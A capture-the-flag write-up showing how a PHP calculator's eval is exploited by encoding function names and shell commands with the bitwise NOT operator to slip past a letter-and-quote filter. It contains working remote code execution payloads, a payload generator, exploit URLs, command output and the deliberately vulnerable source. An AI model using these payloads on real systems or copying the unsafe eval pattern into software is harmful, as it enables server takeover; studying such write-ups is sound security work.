## SimpleCalculator

#### Solved by Fluoxetine

```
Some restriction should prevent this simple calculator from being hacked. Right?

61.28.237.24 30101

authors: d0r4, Em0n
```

We are given a web form that allows us to input values and operations to a calculator and the results will be printed.

Some quick experiments reveal that we can not use neither letters nor quotes. The input must also be shorter than 20 characters.

It’s highly likely that the server is doing some sort of `eval` to perform the calculation. We can exploit it to run functions like `exec("ls")`, but we first need to figure out some way to pass strings.

The trick here is to use the bitwise NOT operator. When PHP encounters `~` and a string, it will invert that string. Therefore, we can invert our string, passing it to the calculator along with `~`, and PHP will invert back to the original string :)

Sample payload for `exec("ls -l >a")`: `(~%9A%87%9A%9C)(~%93%8C%DF%D2%93%DF%C1%9E)`

We need to put the string in bracket to make PHP treat it as string. We don't need any quotes because PHP treats unknown constants as strings (e.g. `echo aabbccdd` will print out `aabbccdd` if `aabbccdd` has not been defined as a constant).

Now it's just the matter of choosing which commands to run. The command has the maximum length of 10.

```php
<?php
echo "(~" . urlencode(~"exec") . ")(~" . urlencode(~"ls -l >a") . ")" . "\n";  // (~%9A%87%9A%9C)(~%93%8C%DF%D2%93%DF%C1%9E)
echo "(~" . urlencode(~"exec") . ")(~" . urlencode(~"ls -l />a") . ")" . "\n"; // (~%9A%87%9A%9C)(~%93%8C%DF%D2%93%DF%D0%C1%9E)
echo "(~" . urlencode(~"exec") . ")(~" . urlencode(~"cat /f*>a") . ")" . "\n"; // (~%9A%87%9A%9C)(~%9C%9E%8B%DF%D0%99%D5%C1%9E)
echo "(~" . urlencode(~"exec") . ")(~" . urlencode(~"rm a") . ")" . "\n";      // (~%9A%87%9A%9C)(~%8D%92%DF%9E)
?>
```

Run the payload like this: `http://61.28.237.24:30101/?equation=(~%9A%87%9A%9C)(~%93%8C%DF%D2%93%DF%C1%9E)`

Read `a`: `http://61.28.237.24:30101/a`

Output of `ls -l >a`:

```
total 4
-rw-r--r--. 1 www-data www-data   0 May 24 01:39 a
-rwxrw-r--. 1 www-data root     856 May 18 11:52 index.php
drwxr-xr-x. 1 www-data root      23 May 18 11:52 static
```

Output of `ls -l />a`:

```
total 4
drwxr-xr-x.   1 root root  28 May 12 12:48 bin
drwxr-xr-x.   2 root root   6 Mar 19 23:44 boot
drwxr-xr-x.   5 root root 360 May 23 13:13 dev
drwxr-xr-x.   1 root root  66 May 23 13:13 etc
-rwxrw-r--.   1 root root  25 May 18 11:52 fl4ggggH3reeeeeeeeeee
drwxr-xr-x.   2 root root   6 Mar 19 23:44 home
drwxr-xr-x.   1 root root  21 May 12 12:48 lib
drwxr-xr-x.   2 root root  34 May 11 00:00 lib64
drwxr-xr-x.   2 root root   6 May 11 00:00 media
drwxr-xr-x.   2 root root   6 May 11 00:00 mnt
drwxr-xr-x.   2 root root   6 May 11 00:00 opt
dr-xr-xr-x. 570 root root   0 May 23 13:13 proc
drwx------.   1 root root   6 May 12 13:41 root
drwxr-xr-x.   1 root root  36 May 23 13:13 run
drwxr-xr-x.   1 root root  20 May 12 12:48 sbin
drwxr-xr-x.   2 root root   6 May 11 00:00 srv
dr-xr-xr-x.  13 root root   0 May 11 11:41 sys
drwxrwxrwt.   1 root root   6 May 12 13:41 tmp
drwxr-xr-x.   1 root root  19 May 11 00:00 usr
drwxr-xr-x.   1 root root  17 May 12 12:43 var
```

Output of `cat /f*>a`:

```
HCMUS-CTF{d4ngErous_eVal}
```

For the sake of fun, we can also dump `index.php`:

```php
<?php
echo "(~" . urlencode(~"exec") . ")(~" . urlencode(~"cat i*>a") . ")" . "\n"; // (~%9A%87%9A%9C)(~%9C%9E%8B%DF%96%D5%C1%9E)
echo "(~" . urlencode(~"exec") . ")(~" . urlencode(~"rm a") . ")" . "\n";     // (~%9A%87%9A%9C)(~%8D%92%DF%9E)
?>
```

```php
<?php

    $html = '   <form>
        <label for="equation">Equation: </label>
            <input name="equation" value="13*37">
        <input type="submit">
    </form>
';
    if (isset($_GET["equation"])) {
        $formula = $_GET["equation"];
        if (preg_match_all('/[a-z\'"`]+/i', $formula)) {
            echo "<video controls autoplay><source src='static/video.mp4' type='video/mp4'></video>";
            echo "<h1>Are you trying to hack me? Alphabetic character and quote is not allowed here</h1>";
        }
        else if (strlen($formula) >= 20) {
            echo "<h1>This is just a simple calculator, not WolframAlpha, try a shorter equation</h1>";
        }
        else
        {
            eval('$res = ' . $formula . ';');
            echo isset($res) ? $res : '?';
        }
    }
    else
        echo $html;
?>
```

**Flag:** `HCMUS-CTF{d4ngErous_eVal}`
